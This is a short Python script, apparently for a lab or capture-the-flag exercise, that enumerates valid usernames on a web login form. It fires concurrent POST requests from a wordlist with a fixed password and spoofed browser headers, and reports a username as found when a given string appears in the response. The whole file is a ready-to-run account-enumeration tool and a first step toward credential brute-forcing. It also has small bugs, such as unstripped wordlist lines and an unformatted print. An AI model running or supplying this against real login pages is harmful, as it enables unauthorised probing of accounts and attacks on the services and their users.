#!username_env/bin/python3

import requests
import argparse
import threading
import pathlib
import re

description = """
Login Post Request Sender\n
Takes in URL, Num Concurrent Requests, Wordlist Path, HTML to find\n
"""
parser = argparse.ArgumentParser(prog='Username Finder', description=description, )
parser.add_argument('-u', '--url', required=True, type=str, help="Url For POST request")
parser.add_argument('-c', '--concurrency', required=True, type=int, help="number of concurrent requests to make")
parser.add_argument('-w', '--wordlist', required=True, type=str, help="Path to wordlist")
parser.add_argument('-s', '--stringtofind', required=True, type=str, help="String to find in HTTP response to signal username found")
parser.add_argument('-e', '--earlystop', default = True, type=bool, help="Stop on first username found")
parser.add_argument('-p', '--password', type=str, default = '1234', help="Password to be used with username")
args = parser.parse_args()

final_usernames = []

def main():
    file_path = pathlib.Path(args.wordlist)

    if file_path.exists():
        split_wordlist(file_path, args.concurrency)
    else:
        print("File not found.")

def split_wordlist(filename, num_threads):
    with open(filename, 'r') as f:
        lines = f.readlines()

    total_lines = len(lines)
    chunk_size = (total_lines + num_threads - 1) // num_threads  # ceil divide
    threads = []

    for i in range(num_threads):
        start = i * chunk_size
        end = min(start + chunk_size, total_lines)
        t = threading.Thread(target=find_username, args=(lines[start:end], ))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    if len(final_usernames) == 0:
        print("No usernames in wordlist worked")
    else:
        print("Working Usernames:", final_usernames)

def find_username(lines):
    headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": re.search(r'^https?://[^/]*?\.com', args.url).group(0),
    "Referer": args.url,
    }

    
    for word in lines:
        data = {'username': word, 'password': args.password}
        try:
            session = requests.Session()
            response = session.post(args.url, data=data, timeout=5, headers = headers)
            response.raise_for_status()  # Raises HTTPError for bad responses (4xx and 5xx)
            if response.status_code == 200:
                html = response.text
                print(html)
                if re.search(args.stringtofind, html):
                    print('Username: %s worked!', word)
                    final_usernames.append(word)
                    if args.earlystop:
                        return
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
    



if __name__ == '__main__':
    main()

